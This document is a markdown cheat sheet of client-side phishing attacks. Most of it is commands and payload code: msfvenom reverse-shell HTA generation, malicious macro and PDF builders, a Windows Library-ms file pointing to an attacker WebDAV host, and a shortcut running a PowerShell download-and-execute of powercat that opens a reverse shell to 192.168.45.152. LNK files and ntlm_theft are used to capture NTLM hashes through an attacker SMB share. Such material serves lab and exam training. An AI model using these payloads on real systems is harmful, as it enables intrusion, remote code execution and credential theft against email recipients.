# 🎣 Client-Side Attacks

## Information Gathering

```shell
exiftool <file>
canarytokens.com # generate a fake url to collect victim data
```

## Attacks

> [evil_macro.py](https://github.com/rodolfomarianocy/Evil-Macro/)

> [malicious-pdf.py](https://github.com/jonaslejon/malicious-pdf)

```shell
# create a malicious HTA with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o file.hta

# generate a malicious macro for a reverse shell in powershell using base64 for .doc
python evil_macro.py -l <ip> -p <port> -o macro.txt

# generate a malicious PDF file
python3 malicious-pdf.py burp-collaborator-url
```

### Windows Library

In Windows, create a file **config.Library-ms** and put the attack IP in the url and save it.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.152</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Now create a shortcut called **install** with the attack machine IP:

```shell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.152:3333/powercat.ps1'); powercat -c 192.168.45.152 -p 4444 -e powershell"
```

Transfer them to to the attack machine, start a webdav server to serve the shortcut, a python http server to serve the powercat script and a listener to receive the reverse shell and send the email.

### Create shortcuts

#### Windows

```ps
$LnkFile = "C:\users\<user>\desktop\Services.lnk"
PS C:\> $WshShell = New-Object -ComObject WScript.Shell
PS C:\> $Shortcut = $WshShell.CreateShortcut($LnkFile)
PS C:\> $Shortcut.TargetPath = "\\192.168.45.191\test\trick.bat"
PS C:\> $Shortcut.Save()
```

#### Linux

> [ntlm_theft.py](https://github.com/Greenwolf/ntlm_theft)

```shell
python ntlm_theft/ntlm_theft.py --g lnk -s 192.168.45.191 -f Services
```
